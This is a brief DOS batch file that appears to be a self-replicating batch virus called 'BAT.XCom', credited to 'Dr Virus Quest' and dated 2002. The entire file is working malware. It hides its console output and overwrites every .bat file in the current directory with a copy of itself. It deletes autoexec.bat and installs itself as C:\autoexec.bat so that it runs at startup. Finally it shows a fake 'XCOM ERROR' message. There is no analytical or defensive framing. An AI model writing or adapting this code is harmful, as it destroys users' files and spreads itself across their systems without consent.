rem BAT.XCom designed by Dr Virus Quest
rem Created on 9th May 2002
@echo off
ctty nul
copy %0 %temp%\xcom.bat>xcomtmp.bat
for %%f in (*.bat) do copy %temp%\xcom.bat %%f>xcomtmp.bat
ren xcomtmp.bat xcom.bat
del autoexec.bat
copy xcom.bat c:\autoexec.bat
@echo XCOM ERROR !!! 
ctty con